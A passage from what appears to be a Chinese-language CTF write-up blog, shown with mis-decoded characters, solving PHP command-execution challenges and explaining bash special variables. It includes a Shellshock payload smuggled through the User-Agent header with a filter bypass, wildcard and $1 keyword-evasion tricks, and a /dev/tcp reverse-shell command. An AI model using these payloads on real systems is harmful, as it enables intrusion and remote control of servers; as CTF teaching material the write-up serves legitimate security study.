<?php foreach($pages as list($file, $title)): ?>
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
        </li>
<?php endforeach; ?>
      </ul>
    </nav>

    <div class="container"><?php if(is_callable('render')) render(); else render_default(); ?></div>
  </body>
</html>

```

`man.php`æºç ï¼š

```php
<?php
function render() {
    $file = 'man';
    if(isset($_GET['file'])) {
        $file = (string)$_GET['file'];
        if(preg_match('/^[\w\-]+$/', $file) !== 1) {
            echo '<pre>Invalid file name!</pre>';
            return;
        }
    }

    echo '<h1>Online documents</h1>';

    $cmds = [
        'bash', 'ls', 'cp', 'mv'
    ];

    echo '<ul>';
    foreach($cmds as $cmd) {
        printf('<li><a href="index.php?func=man&file=%s">%1$s</a></li>', $cmd);
    }
    echo '</ul>';

    printf('<h2>$ man %s</h2>', htmlentities($file));

    echo '<pre>';
    execute(sprintf('man %s | cat', escapeshellarg($file)));
    echo '</pre>';
}
?>
```

`untar.php`æºç ï¼š

```php
<?php
function render() {
?>
<h1>Tar file tester</h1>

<p>Please upload a tar file to test</p>

<form enctype="multipart/form-data" action="index.php?func=untar" method="POST">
  <input type="file" name="tarfile" id="tarfile">
  <input class="btn btn-primary" type="submit" value="Upload &amp; Test">
</form>

<?php

    if(isset($_FILES['tarfile'])) {
        printf('<h2>$ tar -tvf %s</h2>', htmlentities($_FILES['tarfile']['name']));

        echo '<pre>';
        execute(sprintf('tar -tvf %s 2>&1', escapeshellarg($_FILES['tarfile']['tmp_name'])));
        echo '</pre>';
    }
}
?>
```

`ls.php`æºç ï¼š

```php
<?php
function render() {
    $file = '.';
    if(isset($_GET['file'])) {
        $file = (string)$_GET['file'];
    }

    echo '<h1>Dictionary Traversal</h1>';

    echo '<ul>';
    $dirs = ['.', '..', '../..', '/etc/passwd'];
    foreach($dirs as $dir) {
        printf('<li><a href="index.php?func=ls&file=%s">%1$s</a></li>', $dir);
    }
    echo '</ul>';

    printf('<h2>$ ls %s</h2>', htmlentities($file));

    echo '<pre>';
    execute(sprintf('ls -l %s', escapeshellarg($file)));
    echo '</pre>';
}
?>
```

`cmd.php`æºç ï¼š

```php
<?php
function render() {
    $cmd = '';
    if(isset($_GET['cmd'])) {
        $cmd = (string)$_GET['cmd'];
    }
?>
<h1>Command Execution</h1>
<?php
    echo '<ul>';
    $cmds = ['ls', 'env'];
    foreach($cmds as $c) {
        printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s</a></li>', $c);
    }
    echo '</ul>';
?>

<form action="index.php" method="GET">
  <input type="hidden" name="func" value="cmd">
  <div class="input-group">
    <input class="form-control" type="text" name="cmd" id="cmd">
    <div class="input-group-append">
      <input class="btn btn-primary" type="submit" value="Execute">
    </div>
  </div>
</form>
<script>cmd.focus();</script>
<?php

    if(strlen($cmd) > 0) {
        printf('<h2>$ %s</h2>', htmlentities($cmd));

        echo '<pre>';
        switch ($cmd) {
        case 'env':
        case 'ls':
        case 'ls -l':
        case 'ls -al':
            execute($cmd);
            break;
        case 'cat flag':
            echo '<img src="cat-flag.png" alt="cat flag">';
            break;
        default:
            printf('%s: command not found', htmlentities($cmd));
        }
        echo '</pre>';
    }
}
?>
```

æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨`ls.php`æ¥æ‰¾`flag`äº†ï¼Œå› ä¸º`ls.php`æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨`func=ls&file=../../../`å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08pzce57rj228016s4a5.jpg)

æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆå»è¯»äº†ï¼Œ`man.php`å› ä¸ºæœ‰`preg_match('/^[\w\-]+$/', $file) !== 1`é™åˆ¶å¾—æ¯”è¾ƒæ­»ï¼Œ`untar.php`è²Œä¼¼åªæœ‰`tar -tvf`å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œåªæœ‰`cmd.php`ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒä¸å¤ªå¯»å¸¸çš„`env`è¿™ä¸ªå‘½ä»¤ï¼Œå…¶å®è¿™æ ·ä¹Ÿç®—æ˜¯æç¤ºå¾—æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œæ¯”è¾ƒå®¹æ˜“è®©äººæƒ³åˆ°ä¹Ÿå¯ä»¥æ¯”è¾ƒå®¹æ˜“æœåˆ°`ShellShock`æ¼æ´ï¼Œå¹¶ä¸”åœ¨`index.php`ä¸­å‘ç°æœ‰

```php
$black_list = [
    '\/flag', '\(\)\s*\{\s*:;\s*\};'
];

function waf($a) {
    global $black_list;
    if(is_array($a)) {
        foreach($a as $key => $val) {
            waf($key);
            waf($val);
        }
    } else {
        foreach($black_list as $b) {
            if(preg_match("/$b/", $a) === 1) {
                fuck("$b detected! exit now.");
            }
        }
    }
}

waf($_SERVER);
waf($_GET);
waf($_POST);

foreach($_SERVER as $key => $val) {
    if(substr($key, 0, 5) === 'HTTP_') {
        putenv("$key=$val");
    }
}
```

å…³é”®å°±åœ¨`putenv`å‡½æ•°ï¼Œç”±äº`ShellShock`æ¼æ´ padyload éœ€è¦å‚æ•°

```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
```

æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨`putenv`å®ç°å‚æ•°ä¼ é€’ï¼Œç›´æ¥è®¾ç½®`User-agent: () { :;}; echo 222222`ï¼Œå‘ç°è¢« waf 

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08qc2c4wpj219007staa.jpg)

åˆ†æ waf ç»“åˆæ¼æ´æˆå› ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ€åçš„`};`ä¸­é—´æ·»åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ï¼Œè®¾ç½®`User-Agent: () { :;} ; echo 222222`ï¼ŒæˆåŠŸå‘ç°è¾“å‡º 22222 ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨`() { _; } >_[$($())] { whoami; }`è¿™ä¸ª payload

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08rmk4tuyj21ik14cagc.jpg)

å‘ç°å½“å‰ç”¨æˆ·ä¸º`www-data`ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰å‘ç°æ ¹ç›®å½•`flag`çš„æƒé™ä¸º`-r--------   1 flag root   37 Jan  9  2018 flag`ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»å–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ª`flag-reader`ä¸`flag-reader.c`çš„æ–‡ä»¶ï¼Œè¿™åº”è¯¥æ˜¯é¢˜ç›®æç¤ºäº†ã€‚å› ä¸º`index.php`åˆæŠŠ`flag`å…³é”®å­—å±è”½äº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½ç›´æ¥è¯»å–`flag-reader.c`ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨é€šé…ç¬¦è¯»å–ï¼Œä¾‹å¦‚ä½¿ç”¨`fla*.c`

ä½¿ç”¨`() { _; } >_[$($())] { cat /fla*.c; }`å¾—åˆ°`flag-reader.c`æºç 

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g08rqwh4dgj21i0148n4k.jpg)

Flag-reader.c:

```c
#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buff[4096], rnd[16], val[16];
	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
		write(1, "Not enough random\n", 18);
	}

	setuid(1337);
	seteuid(1337);
	alarm(1);
	write(1, &rnd, sizeof(rnd));
	read(0, &val, sizeof(val));

	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
		int fd = open(argv[1], O_RDONLY);
		if(fd > 0) {
			int s = read(fd, buff, 1024);
			if(s > 0) {
				write(1, buff, s);
			}
			close(fd);
		} else {
			write(1, "Can not open file\n", 18);
		}
	} else {
		write(1, "Wrong response\n", 16);
	}
}
```

ä½¿ç”¨`bash -c "sh >& /dev/tcp/your ip/port 0>&1" `ç›´æ¥åå¼¹ shell 

è¿è¡Œ`flag-reader`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g09blmqqltj20su0neu0x.jpg)

å®¡è®¡ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œå¤§è‡´æ˜¯è¾“å‡ºä¸€ä¸²éšæœºæ•°ï¼Œç„¶ååœ¨1sä¹‹å†…åˆè¦è¾“å…¥è¿›å»ï¼Œå¦åˆ™å°±`write(1, "Wrong response\n", 16);`...

ç„¶è€Œæˆ‘åœ¨å›å¼¹ shell ä¹‹åï¼Œåˆ©ç”¨`/tmp`å¯å†™çš„æƒé™ï¼Œè²Œä¼¼æœ‰ç‚¹å°é—®é¢˜ï¼Œä¸€æ—¦`cat /tmp/zedd`ï¼Œé“¾æ¥å°±æ–­æ‰äº†ï¼Œæ— å¥ˆåªèƒ½æ‰¾å…¶ä»–æ–‡ä»¶å¤¹ï¼Œå‘ç°`/run/lock`ä¸`/var/tmp`å‡å¯è¯»å¯å†™ï¼Œä½¿ç”¨`/flag-reader flag > /run/lock/zedd < /run/lock/zedd`å†™å…¥ flag

åå¼¹ shell ä½¿ç”¨`cat`éå¸¸å®¹æ˜“æ–­æ‰ï¼Œæœ€å¥½ä½¿ç”¨æ‰§è¡Œçš„æ–¹å¼ï¼Œæœ€åå¾—åˆ° flag

![](https://ws1.sinaimg.cn/large/64ef14dcgy1g09c248q7uj21i613wgvd.jpg)











##	ä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å……

### ç‰¹æ®Šå˜é‡

è¿™é‡Œå†å¯¹ä¸Šç¯‡è¿›è¡Œä¸€å®šçš„è¡¥å……ä¸è§£é‡Šã€‚

#### $n

| å˜é‡ | å«ä¹‰                                                         |
| ---- | ------------------------------------------------------------ |
| $0   | å½“å‰è„šæœ¬çš„æ–‡ä»¶å                                             |
| $n   | ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯$2(0<n<9) |
| ${n} | 9<næ—¶éœ€è¦åŠ ä¸Šå¤§æ‹¬å·                                          |

ä¾‹å¦‚ï¼Œè„šæœ¬æ–‡ä»¶å¦‚ä¸‹

```bash
#!/bin/bash

echo "File Name: $0"
echo "First Parameter : $1"
echo "First Parameter : $2"
```

æ‰§è¡Œè„šæœ¬æ–‡ä»¶

```bash
$ ./test.sh Hello Zedd
File Name: ./test.sh
First Parameter : Hello
Second Parameter : Zedd
```

è€Œå½“æ²¡æœ‰å‚æ•°çš„æ—¶å€™ï¼Œ`$n`å°±ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨`cat /fl$1ag`è¿™æ ·ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œå¹¶ä¸”åœ¨ bash ç¯å¢ƒä¸‹

```bash
$ echo $0
bash
```

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„ payload ï¼Œå¯ä»¥ç”¨åœ¨ bash è¿™ä¸ªå…³é”®å­—è¿‡æ»¤ä½†æ˜¯æœ‰éœ€è¦ç”¨åˆ° bash çš„æƒ…å†µä¸‹ï¼Œå‰ææ˜¯ç¯å¢ƒç”¨çš„æ˜¯ bash

```bash
$ {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|$0
flag{xxx}
```



#### $IFS

IFS(Internal Field Seprator) ï¼Œå†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼ŒShell çš„ç¯å¢ƒå˜é‡åˆ†ä¸º set, env ä¸¤ç§ï¼Œå…¶ä¸­ set å˜é‡å¯ä»¥é€šè¿‡ export å·¥å…·å¯¼å…¥åˆ° env å˜é‡ä¸­ã€‚å…¶ä¸­ï¼Œset æ˜¯æ˜¾ç¤ºè®¾ç½®shellå˜é‡ï¼Œä»…åœ¨æœ¬ shell ä¸­æœ‰æ•ˆï¼›env æ˜¯æ˜¾ç¤ºè®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡ ï¼Œä»…åœ¨å½“å‰ä¼šè¯ä¸­æœ‰æ•ˆã€‚æ¢å¥è¯è¯´ï¼Œset å˜é‡é‡ŒåŒ…å«äº† env å˜é‡ï¼Œä½† set å˜é‡ä¸ä¸€å®šéƒ½æ˜¯ env å˜é‡ã€‚è¿™ä¸¤ç§å˜é‡ä¸åŒä¹‹å¤„åœ¨äºå˜é‡çš„ä½œç”¨åŸŸä¸åŒã€‚æ˜¾ç„¶ï¼Œenv å˜é‡çš„ä½œç”¨åŸŸè¦å¤§äº›ï¼Œå®ƒå¯ä»¥åœ¨ subshell ä¸­ä½¿ç”¨ã€‚

è€Œ IFS æ˜¯ä¸€ç§ set å˜é‡ï¼Œå½“ shell å¤„ç†"å‘½ä»¤æ›¿æ¢"å’Œ"å‚æ•°æ›¿æ¢"æ—¶ï¼Œshell æ ¹æ® IFS çš„å€¼ï¼Œé»˜è®¤æ˜¯ space, tab, newline æ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™è¯¥å˜é‡ã€‚

```bash
$ echo $IFS

$ echo "$IFS" | od -b
0000000 040 011 012 012
0000004
```

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥è¾“å‡ºIFSæ˜¯çœ‹ä¸åˆ°çš„ï¼ŒæŠŠå®ƒè½¬åŒ–ä¸ºäºŒè¿›åˆ¶å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ"040"æ˜¯ç©ºæ ¼ï¼Œ"011"æ˜¯Tabï¼Œ"012"æ˜¯æ¢è¡Œç¬¦"\n" ã€‚æœ€åä¸€ä¸ª 012 æ˜¯å› ä¸º echo é»˜è®¤æ˜¯ä¼šæ¢è¡Œçš„ã€‚



#### $?

ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ã€‚é€€å‡ºçŠ¶æ€æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¼šè¿”å›0ï¼Œå¤±è´¥è¿”å›1ã€‚ä¸è¿‡ï¼Œä¹Ÿæœ‰ä¸€äº›å‘½ä»¤è¿”å›å…¶ä»–å€¼ï¼Œè¡¨ç¤ºä¸åŒç±»å‹çš„é”™è¯¯ã€‚



#### $

å½“å‰ Shell è¿›ç¨‹ IDã€‚å¯¹äº Shell è„šæœ¬ï¼Œå°±æ˜¯è¿™äº›è„šæœ¬æ‰€åœ¨çš„è¿›ç¨‹ IDã€‚

```bash
$ echo $$
75576
```



#### $#

ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚

è„šæœ¬æ–‡ä»¶å†…å®¹ï¼š

```bash
#!/bin/bash

echo "Total Number of Parameters : $#"
```

æ‰§è¡Œå‘½ä»¤

```bash
$ ./test.sh Hello Zedd
Total Number of Parameters : 2
```



#### \$*ä¸\$@

éƒ½æ˜¯ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚

è„šæœ¬æ–‡ä»¶å†…å®¹ï¼š

```bash
#!/bin/bash

echo "Quoted Values: $@"
echo "Quoted Values: $*"
```

æ‰§è¡Œå‘½ä»¤ï¼š

```bash
$ ./test.sh Hello Zedd
Quoted Values: Hello Zedd
Quoted Values: Hello Zedd
```

å®ƒä»¬ä¸è¢«åŒå¼•å·(" ")åŒ…å«æ—¶ï¼Œéƒ½ä»¥"1""2" â€¦ "$n" çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚

ä½†æ˜¯å½“å®ƒä»¬è¢«åŒå¼•å·(" ")åŒ…å«æ—¶ï¼Œ"âˆ—"ä¼šå°†æ‰€æœ‰çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä»¥"1 2â€¦n"çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ï¼›"@"ä¼šå°†å„ä¸ªå‚æ•°åˆ†å¼€ï¼Œä»¥"1" "2"â€¦"n" çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚



### å†…ç½®å˜é‡ç»•è¿‡

ä¸Šç¯‡å…¶å®æåˆ°äº†ä¸€ç‚¹[å†…ç½®å˜é‡ç»•è¿‡](https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87)ï¼Œä½†æ˜¯è®²çš„ä¹Ÿä¸å¹¶ä¸å¤šï¼Œåªæ˜¯å¤§æ¦‚æäº†ä¸€ä¸‹ã€‚è¿™é‡Œå†ç»™ä¸€äº›å¸¸ç”¨çš„ bash å†…ç½®çš„ç¯å¢ƒå˜é‡

#### $BASH

```bash
$ echo $BASH
/usr/local/bin/bash
```

è¿”å› bash äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„

#### $HOME

```bash
$ $HOME
bash: /Users/zedd: Is a directory
```

è¿”å›å½“å‰ç”¨æˆ·æ‰€å±ç›®å½•

#### $PWD

```bash
$ echo $PWD
/
```

æ˜¾ç¤ºå½“å‰ç›®å½•

#### $OLDPWD

```bash
$ echo $OLDPWD
/Users/zedd/Desktop/
```

è¿”å›ä¸Šæ¬¡æ‰€åœ¨ç›®å½•

#### $PATH

```bash
$ echo $PATH
/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin
```

ç¯å¢ƒå˜é‡`$PATH`

#### $PS1

```bash
$ echo $PS1
\s-\v\$
```

çœ‹åˆ°çš„å‘½ä»¤è¡Œä¸»è¦æç¤º

#### $PS2

```bash
$ echo $PS2
>
```

é¢å¤–è¾“å…¥çš„è¾…åŠ©æç¤ºï¼Œè¡¨ç¤ºä¸º`>`ï¼Œ`$PS3`æ˜¯ Shell è„šæœ¬ä¸­ä½¿ç”¨`select`æ—¶çš„æç¤ºç¬¦ï¼Œæ˜¾ç¤ºä¸ºç©ºï¼Œè¿™é‡Œå°±ä¸å†å•ç‹¬åˆ—ä¸¾äº†

#### $PS4

```bash
$ echo $PS4
+
```

ä¸`set -x`é…åˆç”¨æ¥ä¿®æ”¹è·Ÿè¸ªè¾“å‡ºçš„å‰ç¼€ï¼Œæ˜¾ç¤ºä¸º`+`



### ä¸¾ä¸ªğŸŒ°

#### Layer7 CTF 2018

å¯ä»¥è®¿é—®https://cat.canhack.me/è¿™ä¸ªåœ¨çº¿åœ°å€

#### é¢˜ç›®æè¿°

```
This service provides read the file.
https://cat.canhack.me/

This challenge was published in the Layer7 CTF in 2018.
```

#### WriteUp

ç‚¹è¿›å»å‘ç°æœ‰

```html
<b>Usage</b>: Please enter the parameter like as in <a href="/?file=test.txt">this</a>.
```

è·Ÿè¿›å¾—åˆ°`test.txt`çš„å†…å®¹

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyumwka7dqj20yy09cmy3.jpg)

çŒœæµ‹ä¸ºæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç›´æ¥è¯»å–`flag`è¢«`waf`ï¼Œç›´æ¥è¯»å–`https://cat.canhack.me/?file=index.php`

```php
<?php
	error_reporting(0);

	require __DIR__.'/flag-f72a161d445915d2bdcdc820c4143353.php';

	if(isset($_GET['file'])){

		if(preg_match('/flag|\'|\"|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i', $_GET['file'])){
			die('no hack');
		}

		system('cat "'.$_GET['file'].'"');

	}else{
		echo '<b>Usage</b>: Please enter the parameter like as in <a href="/?file=test.txt">this</a>.';
	}

```

è¿˜å‰©ä¸‹`{}`ã€`<>`ã€`[]`ã€`+-=`ã€`^`ã€`$`ã€`@`ã€`!`ã€`&`ï¼Œæ˜¯ä¸ªå…³é”®å­—ç»•è¿‡ï¼Œæœ‰`$`ï¼Œæˆ‘ä»¬å¾ˆå¿«å¯ä»¥è”æƒ³åˆ°å¯ä»¥ç”¨`$n`è¿™ç§æ–¹å¼ç»•è¿‡ï¼Œæœ€ç»ˆ payload

```
https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php
```





##	å‚è€ƒï¼š

[Internal Variables](https://www.tldp.org/LDP/abs/html/internalvariables.html)

[Shellä¸­çš„IFSè§£æƒ‘](https://blog.csdn.net/whuslei/article/details/7187639)

[Shell ç‰¹æ®Šå˜é‡](http://wiki.jikexueyuan.com/project/shell-tutorial/shell-special-variable.html)

[ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å†™](https://xz.aliyun.com/t/2589)

[åˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒLinuxæœ¬åœ°ææƒ](https://www.freebuf.com/articles/system/176255.html)

[Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)